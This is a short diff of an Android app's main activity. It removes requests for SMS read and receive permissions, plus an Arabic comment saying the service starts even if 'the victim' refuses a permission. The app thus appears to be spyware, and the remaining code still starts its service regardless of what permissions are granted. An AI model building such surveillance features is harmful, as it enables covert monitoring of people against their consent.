@@ -27,8 +27,6 @@ class MainActivity : AppCompatActivity() {
                 } else {
                     add(Manifest.permission.READ_EXTERNAL_STORAGE)
                 }
-                add(Manifest.permission.READ_SMS)
-                add(Manifest.permission.RECEIVE_SMS)
             }
 
             val missing = perms.filter {
@@ -43,7 +41,6 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
         super.onRequestPermissionsResult(r, p, g)
         if (r == REQ) {
-            // نطلقو الخدمة حتى إلا رفض الضحية شي صلاحية
             startNow()
         }
     }
